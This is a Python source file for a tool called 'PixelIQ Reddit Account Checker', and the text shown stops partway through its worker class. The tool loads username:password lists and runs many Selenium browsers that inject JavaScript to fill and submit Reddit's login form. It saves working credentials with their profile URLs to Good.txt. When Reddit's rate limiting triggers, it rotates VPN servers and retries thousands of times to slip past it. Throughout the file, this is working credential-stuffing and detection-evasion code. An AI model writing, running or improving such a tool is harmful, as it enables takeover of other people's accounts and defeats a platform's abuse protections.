"""PixelIQ — Reddit Account Checker
Version 23.1 — Optimized with VPN Control on Success
1. Good detected -> NO VPN change at all (fixed)
2. Login success -> Wait 5 seconds before checking
3. www.reddit.com URL -> No VPN change
"""

import os
import sys
import time
import json
import queue
import threading
import subprocess
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import TimeoutException, WebDriverException
import requests
import webbrowser

# ---------------- CONFIG / PATHS ----------------
BASE = r"C:\Users\Jahid Hasan Shuvo\Desktop\RedditLoginChecker"
Path(BASE).mkdir(parents=True, exist_ok=True)

GECKO_PATH = os.path.join(BASE, "drivers", "geckodriver.exe")
ACCOUNTS_FILE = os.path.join(BASE, "Accounts.txt")
VPN_FILE = os.path.join(BASE, "Servar.txt")
GOOD_FILE = os.path.join(BASE, "Good.txt")
BAD_FILE = os.path.join(BASE, "Bad.txt")
BAN_FILE = os.path.join(BASE, "ban.txt")
SETTINGS_FILE = os.path.join(BASE, "settings.json")

# ---------------- LICENSE SYSTEM ----------------
LICENSE_SHEET_URL = "https://docs.google.com/spreadsheets/d/16RPSRhjOA3Nomjy0iCAvevsD9kn2MADdfusAm_66_EA/export?format=csv&gid=0"
license_valid = False
device_owner = "Unknown"

def check_license_system():
    """Check license from Google Sheets or offline"""
    global license_valid, device_owner
    
    try:
        # Try to load from settings first
        if os.path.exists(SETTINGS_FILE):
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                settings_data = json.load(f)
                license_key = settings_data.get("license_key", "").strip()
                device_owner = settings_data.get("device_owner", "Unknown")
        else:
            license_key = ""
        
        if not license_key:
            return False, "No license key found"
        
        # Online verification from Google Sheets
        try:
            response = requests.get(LICENSE_SHEET_URL, timeout=10)
            if response.status_code == 200:
                lines = response.text.strip().split('\n')
                for line in lines:
                    parts = line.split(',')
                    if len(parts) >= 2:
                        sheet_key = parts[0].strip()
                        sheet_owner = parts[1].strip()
                        if sheet_key == license_key:
                            device_owner = sheet_owner
                            # Save to settings
                            settings_data["device_owner"] = sheet_owner
                            with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
                                json.dump(settings_data, f, indent=4)
                            return True, f"License valid - Owner: {sheet_owner}"
        except:
            # Offline verification (fallback)
            if len(license_key) >= 8:
                return True, f"License verified offline - Owner: {device_owner}"
        
        return False, "Invalid license key"
        
    except Exception as e:
        return False, f"License check error: {str(e)}"

# ---------------- DEFAULT SETTINGS ----------------
DEFAULT_SETTINGS = {
    "max_browsers": 10,
    "vpn_enabled": True,
    "vpn_connect_cmd": "cd \"C:\\Program Files (x86)\\ExpressVPN\\services\" && ExpressVPN.CLI.exe connect \"{server}\"",
    "vpn_disconnect_cmd": "cd \"C:\\Program Files (x86)\\ExpressVPN\\services\" && ExpressVPN.CLI.exe disconnect",
    "vpn_pause_seconds": 5,
    "rate_limit_wait_seconds": 5,
    "success_wait_seconds": 10,
    "login_url": "https://www.reddit.com/login/",
    "use_old_reddit": False,
    "headless": False,
    "implicit_wait_seconds": 3,
    "max_retries_on_rate_limit": 9999,
    "rate_limit_strings": [
        "try again later",
        "rate limited",
        "too many requests",
        "unusual traffic",
        "something went wrong",
        "server error"
    ],
    "invalid_strings": [
        "wrong password",
        "incorrect username",
        "invalid username",
        "incorrect password",
        "invalid email",
        "invalid email or password",
        "incorrect username or password"
    ],
    "ban_strings": [
        "this account has been permanently banned",
        "check your inbox for a message with more information",
        "visit inbox",
        "for your security, we've locked your account after detecting some unusual activity",
        "reset your password",
        "reset password",
        "locked your account"
    ],
    "extension_error_strings": [
        "An error occurred. Please disable any extensions or try using a different web browser to continue."
    ],
    "already_logged_in_strings": [
        "Welcome back!",
        "You are already logged in",
        "redirected back to Reddit shortly",
        "already logged in and will be redirected"
    ],
    "worker_delay_between_accounts": 0.5,
    "license_key": "",
    "device_owner": "Unknown",
    "login_success_wait_seconds": 5,  # New setting: Wait after login success
    "disable_vpn_on_success": True    # New setting: Disable VPN change on success
}

def load_settings():
    s = DEFAULT_SETTINGS.copy()
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            s.update(data)
        except Exception as e:
            print(f"⚠ Settings load error: {e} — using defaults")
    return s

settings = load_settings()

MAX_BROWSERS = min(int(settings.get("max_browsers", 10)), 15)
VPN_ENABLED = bool(settings.get("vpn_enabled", True))
VPN_CONNECT_CMD = settings.get("vpn_connect_cmd")
VPN_DISCONNECT_CMD = settings.get("vpn_disconnect_cmd")
VPN_PAUSE_SECONDS = float(settings.get("vpn_pause_seconds", 5))
RATE_LIMIT_WAIT_SECONDS = float(settings.get("rate_limit_wait_seconds", 5))
SUCCESS_WAIT_SECONDS = float(settings.get("success_wait_seconds", 10))
LOGIN_URL = settings.get("login_url", DEFAULT_SETTINGS["login_url"])
USE_OLD_REDDIT = bool(settings.get("use_old_reddit", False))
HEADLESS = bool(settings.get("headless", False))
IMPLICIT_WAIT = float(settings.get("implicit_wait_seconds", 3))
MAX_RETRIES = int(settings.get("max_retries_on_rate_limit", 9999))
RATE_LIMIT_STRINGS = [s.lower() for s in settings.get("rate_limit_strings", [])]
INVALID_STRINGS = [s.lower() for s in settings.get("invalid_strings", [])]
BAN_STRINGS = [s.lower() for s in settings.get("ban_strings", [])]
EXTENSION_ERROR_STRINGS = [s.lower() for s in settings.get("extension_error_strings", [])]
ALREADY_LOGGED_IN_STRINGS = [s.lower() for s in settings.get("already_logged_in_strings", [])]
WORKER_SLEEP = float(settings.get("worker_delay_between_accounts", 0.5))
LOGIN_SUCCESS_WAIT = float(settings.get("login_success_wait_seconds", 5))  # Wait after login success
DISABLE_VPN_ON_SUCCESS = bool(settings.get("disable_vpn_on_success", True))  # Disable VPN on success

# ---------------- Thread-safe structures ----------------
accounts_q = queue.Queue()
file_lock = threading.Lock()
vpn_lock = threading.Lock()
stats_lock = threading.Lock()
vpn_change_lock = threading.Lock()

stats = {
    "total": 0,
    "processing": 0,
    "success": 0,
    "failed": 0,
    "banned": 0,
    "rate_limits": 0,
    "vpn_changes": 0,
    "extension_errors": 0,
    "already_logged_in": 0,
    "start_time": time.time()
}

bot_running = True
global_rate_limit_detected = False
rate_limit_event = threading.Event()
active_workers = set()
current_vpn_server_index = 0
rate_limit_detected_flag = False
vpn_rotation_in_progress = False
success_detected_flag = False  # Flag when any worker detects success

# ---------------- VPN SERVERS LIST ----------------
VPN_SERVERS_LIST = [
    "Australia - Adelaide",
    "Australia - Brisbane",
    "Australia - Melbourne",
    "Australia - Perth",
    "Australia - Sydney",
    "Australia - Sydney - 2",
    "Bhutan",
    "Brunei",
    "Cambodia",
    "Guam",
    "Hong Kong - 1",
    "Hong Kong - 2",
    "India (via Singapore)",
    "India (via UK)",
    "Indonesia",
    "Japan - Osaka",
    "Japan - Shibuya",
    "Japan - Tokyo",
    "Japan - Yokohama",
    "Kazakhstan",
    "Laos",
    "Macau",
    "Malaysia",
    "Mongolia",
    "Myanmar",
    "Nepal",
    "New Zealand",
    "Pakistan",
    "Philippines",
    "Pick for Me",
    "Singapore - CBD",
    "Singapore - Jurong",
    "Singapore - Marina Bay",
    "South Korea - 2",
    "Sri Lanka",
    "Taiwan - 3",
    "Thailand",
    "Uzbekistan",
    "Vietnam",
    "Argentina",
    "Bahamas",
    "Bermuda",
    "Bolivia",
    "Brazil",
    "Brazil - 2",
    "Canada - Montreal",
    "Canada - Toronto",
    "Canada - Toronto - 2",
    "Canada - Vancouver",
    "Cayman Islands",
    "Chile",
    "Colombia",
    "Costa Rica",
    "Cuba",
    "Dominican Republic",
    "Ecuador",
    "Guatemala",
    "Honduras",
    "Jamaica",
    "Mexico",
    "Panama",
    "Peru",
    "Puerto Rico",
    "Trinidad and Tobago",
    "Uruguay",
    "USA - Albuquerque",
    "USA - Anchorage",
    "USA - Atlanta",
    "USA - Baltimore",
    "USA - Billings",
    "USA - Birmingham",
    "USA - Boise",
    "USA - Boston",
    "USA - Bridgeport",
    "USA - Burlington",
    "USA - Charleston - South Carolina",
    "USA - Charleston - West Virginia",
    "USA - Charlotte",
    "USA - Cheyenne",
    "USA - Chicago",
    "USA - Columbus",
    "USA - Dallas",
    "USA - Denver",
    "USA - Des Moines",
    "USA - Detroit",
    "USA - Fargo",
    "USA - Honolulu",
    "USA - Houston",
    "USA - Indianapolis",
    "USA - Jackson",
    "USA - Las Vegas",
    "USA - Lincoln Park",
    "USA - Little Rock",
    "USA - Los Angeles - 1",
    "USA - Los Angeles - 2",
    "USA - Los Angeles - 3",
    "USA - Los Angeles - 5",
    "USA - Louisville",
    "USA - Manchester",
    "USA - Miami",
    "USA - Miami - 2",
    "USA - Milwaukee",
    "USA - Minneapolis",
    "USA - Nashville",
    "USA - New Jersey - 1",
    "USA - New Jersey - 2",
    "USA - New Jersey - 3",
    "USA - New Orleans",
    "USA - New York",
    "USA - Oklahoma City",
    "USA - Omaha",
    "USA - Philadelphia",
    "USA - Phoenix",
    "USA - Portland - Maine",
    "USA - Portland - Oregon",
    "USA - Providence",
    "USA - Salt Lake City",
    "USA - San Francisco",
    "USA - Santa Monica",
    "USA - Seattle",
    "USA - Sioux Falls",
    "USA - St. Louis",
    "USA - Tampa - 1",
    "USA - Virginia Beach",
    "USA - Washington DC",
    "USA - Wichita",
    "USA - Wilmington",
    "Venezuela",
    "Albania",
    "Andorra",
    "Armenia",
    "Austria",
    "Azerbaijan",
    "Belarus",
    "Belgium",
    "Bosnia and Herzegovina",
    "Bulgaria",
    "Croatia",
    "Cyprus",
    "Czech Republic",
    "Denmark",
    "Estonia",
    "Finland",
    "France - Alsace",
    "France - Marseille",
    "France - Paris - 2",
    "France - Strasbourg",
    "Georgia",
    "Germany - Frankfurt - 1",
    "Germany - Frankfurt - 3",
    "Germany - Nuremberg",
    "Greece",
    "Hungary",
    "Iceland",
    "Ireland",
    "Isle of Man",
    "Italy - Cosenza",
    "Italy - Naples",
    "Jersey",
    "Latvia",
    "Liechtenstein",
    "Lithuania",
    "Luxembourg",
    "Malta",
    "Moldova",
    "Monaco",
    "Montenegro",
    "Netherlands - Amsterdam",
    "Netherlands - Rotterdam",
    "Netherlands - The Hague",
    "North Macedonia",
    "Norway",
    "Poland",
    "Portugal",
    "Romania",
    "Serbia",
    "Slovakia",
    "Slovenia",
    "Spain - Barcelona",
    "Spain - Barcelona - 2",
    "Spain - Madrid",
    "Sweden",
    "Sweden - 2",
    "Switzerland",
    "Turkey",
    "UK - Docklands",
    "UK - East London",
    "UK - London",
    "UK - Midlands",
    "UK - Tottenham",
    "UK - Wembley",
    "Ukraine",
    "Algeria",
    "Egypt",
    "Ghana",
    "Kenya",
    "Lebanon",
    "Morocco",
    "South Africa",
    "United Arab Emirates"
]

# ---------------- RGB THEME COLORS ----------------
DARK_BG = "#0a0a0a"
DARK_FG = "#ffffff"
DARK_BG2 = "#1a1a1a"
DARK_BG3 = "#2a2a2a"
ACCENT_COLOR = "#ff4500"
SUCCESS_COLOR = "#00ff88"
ERROR_COLOR = "#ff4444"
WARNING_COLOR = "#ffaa00"
BAN_COLOR = "#ff0066"
VPN_COLOR = "#0088ff"
PROCESSING_COLOR = "#ff8800"
INFO_COLOR = "#00aaff"
ORANGE_COLOR = "#ff8800"
YELLOW_COLOR = "#ffff00"
RED_COLOR = "#ff0000"
GREEN_COLOR = "#00ff00"
LICENSE_VALID_COLOR = "#00ff00"
LICENSE_INVALID_COLOR = "#ff4444"

# ---------------- Helper Functions ----------------
def remove_account_from_file(username, password):
    """Remove checked account from Accounts.txt - IMMEDIATELY after check"""
    try:
        with file_lock:
            if not os.path.exists(ACCOUNTS_FILE):
                return False
            
            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                accounts = f.readlines()
            
            account_to_remove = f"{username}:{password}"
            new_accounts = []
            removed = False
            
            for account in accounts:
                account_line = account.strip()
                if account_line == account_to_remove:
                    removed = True
                    continue
                if account_line:
                    new_accounts.append(account)
            
            if removed:
                with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
                    f.writelines(new_accounts)
            
            return removed
            
    except Exception as e:
        print(f"❌ Error removing account from file: {e}")
        return False

def append_file_text(path, line):
    with file_lock:
        try:
            directory = os.path.dirname(path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
                
            with open(path, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception as e:
            print(f"❌ File write error ({path}): {e}")

def read_accounts():
    if not os.path.exists(ACCOUNTS_FILE):
        return []
    accounts = []
    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        for ln in f:
            s = ln.strip()
            if not s:
                continue
            if ":" in s:
                accounts.append({"cred": s, "retries": 0})
    return accounts

def run_cmd(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, check=False, 
                              stdout=subprocess.PIPE, 
                              stderr=subprocess.PIPE, 
                              timeout=timeout)
        return result.returncode == 0
    except Exception as e:
        print(f"⚠ run_cmd error: {e}")
        return False

# ---------------- VPN Manager Class ----------------
class VPNManager:
    """Manages VPN connections with thread safety"""
    def __init__(self):
        self.lock = threading.Lock()
        self.paused_event = threading.Event()
        self.paused_event.set()
        self.current_server = VPN_SERVERS_LIST[0] if VPN_SERVERS_LIST else None
        self.pause_count = 0
        self.disable_vpn_change = False  # Disable VPN change when successful login
        self.vpn_change_pending = False
        
    def pause_all_workers(self):
        with self.lock:
            self.pause_count += 1
            self.paused_event.clear()
            return self.pause_count
            
    def resume_all_workers(self):
        with self.lock:
            self.pause_count = max(0, self.pause_count - 1)
            if self.pause_count == 0:
                self.paused_event.set()
            return self.pause_count
    
    def wait_if_paused(self):
        self.paused_event.wait()
    
    def set_disable_vpn_change(self, disable=True):
        with self.lock:
            self.disable_vpn_change = disable
    
    def is_vpn_change_disabled(self):
        with self.lock:
            return self.disable_vpn_change

# Create global VPN manager
vpn_manager = VPNManager()

def connect_vpn_initial(gui_log=None):
    if not VPN_ENABLED:
        if gui_log: gui_log("🔸 VPN disabled in settings", "info")
        return True
        
    if not VPN_SERVERS_LIST:
        if gui_log: gui_log("⚠️ No VPN servers available", "warning")
        return False
    
    server = vpn_manager.current_server or VPN_SERVERS_LIST[0]
    
    with vpn_lock:
        if gui_log: gui_log(f"🔌 Initial VPN connection -> {server}", "vpn")
        
        run_cmd(VPN_DISCONNECT_CMD)
        time.sleep(2.0)
        
        connect_cmd = VPN_CONNECT_CMD.format(server=server)
        ok = run_cmd(connect_cmd)
        time.sleep(VPN_PAUSE_SECONDS)
        
        if ok:
            if gui_log: gui_log(f"✅ VPN connected -> {server}", "success")
            return True
        else:
            if gui_log: gui_log(f"❌ VPN connect failed -> {server}", "error")
            return False

def rotate_vpn_for_all_workers(worker_id, gui_log=None):
    """Rotate VPN when ANY worker hits rate limit - but only ONCE even if multiple workers hit"""
    global current_vpn_server_index, vpn_rotation_in_progress, success_detected_flag
    
    if not VPN_ENABLED:
        if gui_log: gui_log(f"🔸 VPN disabled", "info")
        return vpn_manager.current_server
    
    # Check if success was detected - if yes, NO VPN CHANGE
    if success_detected_flag and DISABLE_VPN_ON_SUCCESS:
        if gui_log: gui_log(f"⚠️ VPN change disabled (successful login detected)", "warning")
        return vpn_manager.current_server
    
    # Check if VPN change is disabled
    if vpn_manager.is_vpn_change_disabled():
        if gui_log: gui_log(f"⚠️ VPN change disabled", "warning")
        return vpn_manager.current_server
    
    # Prevent multiple simultaneous rotations
    if vpn_rotation_in_progress:
        if gui_log: gui_log(f"⏳ VPN rotation already in progress, waiting...", "info")
        while vpn_rotation_in_progress:
            time.sleep(1)
        return vpn_manager.current_server
    
    # Set rotation in progress flag
    vpn_rotation_in_progress = True
    
    try:
        # GLOBAL LOCK - Only one rotation at a time
        with vpn_change_lock:
            # Check again after acquiring lock
            if success_detected_flag and DISABLE_VPN_ON_SUCCESS:
                vpn_rotation_in_progress = False
                return vpn_manager.current_server
                
            if vpn_manager.is_vpn_change_disabled():
                vpn_rotation_in_progress = False
                return vpn_manager.current_server
                
            pause_level = vpn_manager.pause_all_workers()
            if pause_level == 1:
                if gui_log: gui_log(f"⏸️ Pausing ALL workers for VPN change...", "vpn")
            
            with vpn_lock:
                success = False
                attempt = 0
                max_attempts = 3
                
                while not success and attempt < max_attempts:
                    # Get next server in sequence
                    current_vpn_server_index = (current_vpn_server_index + 1) % len(VPN_SERVERS_LIST)
                    new_server = VPN_SERVERS_LIST[current_vpn_server_index]
                    
                    if gui_log: gui_log(f"🔄 Rotating VPN -> {new_server} (Attempt {attempt + 1}/{max_attempts})", "vpn")
                    
                    # Disconnect first
                    run_cmd(VPN_DISCONNECT_CMD)
                    time.sleep(1.5)
                    
                    # Try to connect to new server
                    connect_cmd = VPN_CONNECT_CMD.format(server=new_server)
                    ok = run_cmd(connect_cmd)
                    
                    if gui_log: gui_log(f"⏳ Waiting {VPN_PAUSE_SECONDS} seconds after VPN change...", "vpn")
                    time.sleep(VPN_PAUSE_SECONDS)
                    
                    if ok:
                        vpn_manager.current_server = new_server
                        with stats_lock:
                            stats["vpn_changes"] += 1
                        if gui_log: gui_log(f"✅ VPN rotated -> {new_server}", "success")
                        success = True
                    else:
                        if gui_log: gui_log(f"❌ Failed to connect to {new_server}, trying next...", "vpn")
                        attempt += 1
                
                if not success:
                    if gui_log: gui_log(f"❌ VPN rotation failed", "error")
                    # Try first server as fallback
                    if gui_log: gui_log(f"🔄 Trying first server as fallback...", "vpn")
                    first_server = VPN_SERVERS_LIST[0]
                    run_cmd(VPN_DISCONNECT_CMD)
                    time.sleep(1.5)
                    connect_cmd = VPN_CONNECT_CMD.format(server=first_server)
                    ok = run_cmd(connect_cmd)
                    time.sleep(VPN_PAUSE_SECONDS)
                    if ok:
                        current_vpn_server_index = 0
                        vpn_manager.current_server = first_server
                        if gui_log: gui_log(f"✅ Connected to first server -> {first_server}", "success")
                        success = True
            
            resume_level = vpn_manager.resume_all_workers()
            if resume_level == 0:
                if gui_log: gui_log(f"▶️ Resuming ALL workers after VPN change", "vpn")
    
    finally:
        vpn_rotation_in_progress = False
    
    return vpn_manager.current_server

# ---------------- Browser startup ----------------
def start_firefox_instance():
    opts = Options()
    if HEADLESS:
        opts.add_argument("--headless")
    opts.set_preference("dom.webnotifications.enabled", False)
    opts.set_preference("dom.push.enabled", False)
    opts.set_preference("permissions.default.image", 2)
    
    opts.add_argument(f"--width=1100")
    opts.add_argument(f"--height=900")
    service = Service(GECKO_PATH)
    driver = webdriver.Firefox(service=service, options=opts)
    driver.implicitly_wait(IMPLICIT_WAIT)
    return driver

# ---------------- JS filler + click templates ----------------
JS_FILL_TEMPLATE = r"""
function dispatchEvents(el, value){
  try{
    el.focus();
    el.value = value;
    el.dispatchEvent(new Event('input',{bubbles:true}));
    el.dispatchEvent(new Event('change',{bubbles:true}));
    el.dispatchEvent(new Event('blur',{bubbles:true}));
    return true;
  }catch(e){
    return false;
  }
}
function findAndSet(selectorList, value){
  for(let sel of selectorList){
    try{
      let el = document.querySelector(sel);
      if(el) { if(dispatchEvents(el, value)) return true; }
    }catch(e){}
  }
  for(let sel of selectorList){
    try{
      let els = document.querySelectorAll(sel);
      if(els && els.length){
        if(dispatchEvents(els[0], value)) return true;
      }
    }catch(e){}
  }
  for(let sel of selectorList){
    try{
      let m = sel.match(/input\[name=['"]?([^'"\]]+)['"]?\]/i);
      if(m && m[1]){
        let els = document.getElementsByName(m[1]);
        if(els && els.length){
          if(dispatchEvents(els[0], value)) return true;
        }
      }
    }catch(e){}
  }
  return false;
}
return {
  userOK: findAndSet(arguments[0], arguments[1]),
  passOK: findAndSet(arguments[2], arguments[3])
};
"""

JS_FORCE_ENABLE = r"""
try {
  let btns = document.querySelectorAll('button');
  btns.forEach(b => { try{ b.removeAttribute('disabled'); b.disabled = false; }catch(e){} });
} catch(e){}
return true;
"""

JS_CLICK_LOGIN = r"""
function tryClick(){
  try{
    let selectors = ['button[type=submit]','button[class*="login"]','button[class*="submit"]','button'];
    for(let sel of selectors){
      let btns = document.querySelectorAll(sel);
      for(let b of btns){
        let t = (b.textContent||'').trim().toLowerCase();
        if(t=='' || t.includes('log in') || t.includes('login') || t.includes('sign in') || t.includes('continue')){
          try{ b.click(); return true; }catch(e){}
        }
      }
    }
    let forms = document.querySelectorAll('form');
    for(let f of forms){
      try{ f.submit(); return true; }catch(e){}
    }
  }catch(e){}
  return false;
}
return tryClick();
"""

JS_CHECK_BAN_MESSAGES = r"""
function checkBanMessages(){
  try {
    let pageText = document.body.innerText.toLowerCase();
    
    let banPhrases = [
      'this account has been permanently banned',
      'check your inbox for a message with more information',
      'visit inbox',
      'for your security, we\'ve locked your account after detecting some unusual activity',
      'reset your password',
      'reset password',
      'locked your account',
      'reset your password'
    ];
    
    for(let phrase of banPhrases){
      if(pageText.includes(phrase)){
        return true;
      }
    }
    
    return false;
  } catch(e) {
    return false;
  }
}
return checkBanMessages();
"""

JS_CHECK_LOGGED_IN = r"""
function checkLoggedIn(){
  try {
    if(!window.location.href.includes('https://www.reddit.com')){
      return false;
    }
    
    let loginElements = document.querySelectorAll('input[name="username"], input[name="password"], a[href*="/login"]');
    if(loginElements.length > 0){
      return false;
    }
    
    let loggedInIndicators = [
      document.querySelector('[data-testid="user-avatar"]'),
      document.querySelector('button[aria-label="User menu"]'),
      document.querySelector('[data-testid="user-profile-link"]'),
      document.querySelector('a[href*="/user/"]'),
      document.querySelector('a[href="/submit"]')
    ];
    
    for(let indicator of loggedInIndicators){
      if(indicator && indicator.offsetParent !== null){
        return true;
      }
    }
    
    return false;
  } catch(e) {
    return false;
  }
}
return checkLoggedIn();
"""

JS_CHECK_REDDIT_HOMEPAGE = r"""
function isRedditHomepage() {
  try {
    let currentUrl = window.location.href.toLowerCase();
    
    // Check if we're on Reddit
    if (!currentUrl.includes('reddit.com')) {
      return false;
    }
    
    // Check if NOT on login page
    if (currentUrl.includes('/login')) {
      return false;
    }
    
    // Check for Reddit homepage elements
    let homepageElements = [
      'div[data-testid="frontpage-sidebar"]',
      'div[data-testid="subreddit-sidebar"]',
      'div[role="feed"]',
      'article[data-testid="post-container"]',
      'div[class*="Post"]',
      'div[data-click-id="background"]'
    ];
    
    for (let selector of homepageElements) {
      if (document.querySelector(selector)) {
        return true;
      }
    }
    
    // Check for common Reddit text
    let pageText = document.body.innerText.toLowerCase();
    let redditKeywords = [
      'r/all',
      'popular',
      'home',
      'create post',
      'joined',
      'online',
      'members',
      'posts',
      'comments',
      'upvotes'
    ];
    
    for (let keyword of redditKeywords) {
      if (pageText.includes(keyword)) {
        return true;
      }
    }
    
    return false;
  } catch(e) {
    return false;
  }
}
return isRedditHomepage();
"""

# ---------------- Worker thread ----------------
class Worker(threading.Thread):
    def __init__(self, idx, gui_logger=None):
        super().__init__(daemon=True)
        self.idx = idx
        self.driver = None
        self.gui_logger = gui_logger
        self.current_account = None
        self.login_page_ready = False
        self.account_checked = False

    def log(self, message, color_tag="normal"):
        ts = time.strftime("%H:%M:%S")
        msg = f"[W{self.idx}] {message}"
        print(f"[{ts}] {msg}")
        if self.gui_logger:
            try:
                self.gui_logger(msg, color_tag)
            except:
                pass

    def run(self):
        try:
            self.driver = start_firefox_instance()
            self.log("✅ Browser started successfully", "success")
            active_workers.add(self.idx)
            
            self.log("📄 Loading login page...", "info")
            self.driver.get("https://www.reddit.com/login/")
            time.sleep(5)
            self.login_page_ready = True
            self.log("✅ Login page ready for use", "success")
            
        except Exception as e:
            self.log(f"❌ Browser start failed: {e}", "error")
            return

        while bot_running:
            vpn_manager.wait_if_paused()
            
            if global_rate_limit_detected:
                time.sleep(1)
                continue
                
            try:
                item = accounts_q.get(timeout=3)
            except queue.Empty:
                break

            cred = item.get("cred")
            retries = item.get("retries", 0)
            if not cred:
                accounts_q.task_done()
                continue

            try:
                user, pw = cred.split(":", 1)
            except Exception:
                self.log("Bad credential format -> skipping", "warning")
                accounts_q.task_done()
                continue

            with stats_lock:
                stats["processing"] += 1

            try:
                self.current_account = f"{user}:{pw}"
                self.account_checked = False
                ok = self.attempt_login(user.strip(), pw.strip(), retries)
            except Exception as e:
                self.log(f"Exception during attempt: {e}", "error")
                if not self.account_checked:
                    append_file_text(BAD_FILE, f"{user}:{pw}")
                    with stats_lock:
                        stats["failed"] += 1
                    remove_account_from_file(user, pw)
            finally:
                with stats_lock:
                    stats["processing"] = max(0, stats["processing"] - 1)
                accounts_q.task_done()
                time.sleep(WORKER_SLEEP)

        try:
            if self.driver:
                self.driver.quit()
                self.log("Browser closed", "info")
            active_workers.discard(self.idx)
        except:
            pass

    def is_reddit_homepage(self, driver):
        """Check if we're on Reddit homepage (not login page)"""
        try:
            current_url = driver.current_url.lower()
            
            if "reddit.com" in current_url and "/login" not in current_url:
                try:
                    is_homepage = driver.execute_script(JS_CHECK_REDDIT_HOMEPAGE)
                    if is_homepage:
                        return True
                except:
                    pass
                
                homepage_selectors = [
                    'div[data-testid="frontpage-sidebar"]',
                    'div[data-testid="subreddit-sidebar"]',
                    'div[role="feed"]',
                    'article[data-testid="post-container"]'
                ]
                
                for selector in homepage_selectors:
                    try:
                        if driver.find_elements(By.CSS_SELECTOR, selector):
                            return True
                    except:
                        continue
                
                page_text = driver.page_source.lower()
                reddit_keywords = [
                    'r/all',
                    'popular',
                    'home',
                    'create post',
                    'joined',
                    'online',
                    'members'
                ]
                
                for keyword in reddit_keywords:
                    if keyword in page_text:
                        return True
            
            return False
            
        except Exception as e:
            self.log(f"Error checking Reddit homepage: {e}", "warning")
            return False

    def is_login_page_ready(self, driver):
        try:
            page_text = driver.page_source.lower()
            
            login_form_elements = [
                "input[name='username']",
                "input[name='password']",
                "input[type='password']",
                "button[type='submit']"
            ]
            
            for element in login_form_elements:
                try:
                    if driver.find_elements(By.CSS_SELECTOR, element):
                        return True
                except:
                    continue
                    
            return False
            
        except Exception as e:
            self.log(f"Login page check error: {e}", "warning")
            return False

    def perform_logout(self, driver):
        try:
            self.log("🔄 Performing logout...", "vpn")
            
            driver.delete_all_cookies()
            driver.execute_script("localStorage.clear(); sessionStorage.clear();")
            
            driver.get("https://www.reddit.com/login/")
            time.sleep(2)
            
            self.log("✅ Logout successful", "success")
            return True
            
        except Exception as e:
            self.log(f"❌ Logout error: {e}", "error")
            try:
                driver.delete_all_cookies()
                driver.execute_script("localStorage.clear(); sessionStorage.clear();")
                driver.get("https://www.reddit.com/login/")
                time.sleep(2)
                self.log("✅ Browser cleared despite logout error", "success")
                return True
            except:
                self.log("❌ Failed to clear browser", "error")
                return False

    def save_good_account(self, username, password):
        """Save successful account to Good.txt"""
        try:
            profile_url = ""
            try:
                self.driver.get("https://www.reddit.com/user/me/")
                time.sleep(2)
                profile_url = self.driver.current_url
            except:
                profile_url = "https://www.reddit.com"
            
            good_entry = f"{username}:{password} | Profile URL: {profile_url}"
            append_file_text(GOOD_FILE, good_entry)
            
            with stats_lock:
                stats["success"] += 1
            
            self.account_checked = True
            
            self.log(f"✅ Account saved to Good.txt: [{username}]", "success")
            return True
            
        except Exception as e:
            self.log(f"❌ Error saving good account: {e}", "error")
            return False

    def handle_already_logged_in(self, username, password):
        self.log("🔄 Already logged in detected - performing logout...", "vpn")
        
        try:
            logout_success = self.perform_logout(self.driver)
            
            if logout_success:
                accounts_q.put({"cred": f"{username}:{password}", "retries": 0})
                with stats_lock:
                    stats["already_logged_in"] += 1
                self.log("✅ Logout successful - retrying account", "success")
                return True
            else:
                self.log("❌ Logout failed - saving to Bad.txt", "error")
                append_file_text(BAD_FILE, f"{username}:{password}")
                with stats_lock:
                    stats["failed"] += 1
                remove_account_from_file(username, password)
                return False
                
        except Exception as e:
            self.log(f"❌ Error handling already logged in: {e}", "error")
            append_file_text(BAD_FILE, f"{username}:{password}")
            with stats_lock:
                stats["failed"] += 1
            remove_account_from_file(username, password)
            return False

    def handle_invalid_credentials(self, username, password):
        try:
            self.log(f"❌ incorrect username or password", "error")
            bad_entry = f"{username}:{password}"
            append_file_text(BAD_FILE, bad_entry)
            with stats_lock:
                stats["failed"] += 1
            remove_account_from_file(username, password)
            self.account_checked = True
            return True
        except Exception as e:
            self.log(f"❌ Error saving to Bad.txt: {e}", "error")
            return False

    def handle_extension_error(self, username, password):
        self.log("🔄 Extension error detected - clearing browser data...", "vpn")
        
        try:
            self.driver.delete_all_cookies()
            self.driver.execute_script("localStorage.clear(); sessionStorage.clear();")
            
            self.driver.get("https://www.reddit.com/login/")
            time.sleep(3)
            
            accounts_q.put({"cred": f"{username}:{password}", "retries": 0})
            with stats_lock:
                stats["extension_errors"] += 1
            self.log("✅ Browser cleared - retrying account", "success")
            return True
        except Exception as e:
            self.log(f"❌ Failed to clear browser: {e}", "error")
            return False

    def check_for_rate_limit(self, page_src):
        page_src_lower = page_src.lower()
        
        reset_lock_phrases = [
            "reset your password",
            "reset password", 
            "locked your account",
            "for your security, we've locked your account"
        ]
        
        for phrase in reset_lock_phrases:
            if phrase in page_src_lower:
                return False
        
        for phrase in RATE_LIMIT_STRINGS:
            if phrase in page_src_lower:
                return True
        
        return False

    def check_for_ban_on_homepage(self, driver):
        """Check for banned/locked accounts on homepage"""
        try:
            try:
                js_ban_detected = driver.execute_script(JS_CHECK_BAN_MESSAGES)
                if js_ban_detected:
                    return True
            except:
                pass
            
            page_src = driver.page_source.lower()
            page_text = driver.execute_script("return document.body.innerText.toLowerCase()") if driver else page_src
            
            ban_messages = [
                "this account has been permanently banned",
                "check your inbox for a message with more information",
                "visit inbox",
                "for your security, we've locked your account after detecting some unusual activity",
                "reset your password",
                "locked your account"
            ]
            
            for message in ban_messages:
                if message in page_src or (page_text and message in page_text):
                    return True
                    
            return False
            
        except Exception as e:
            return False

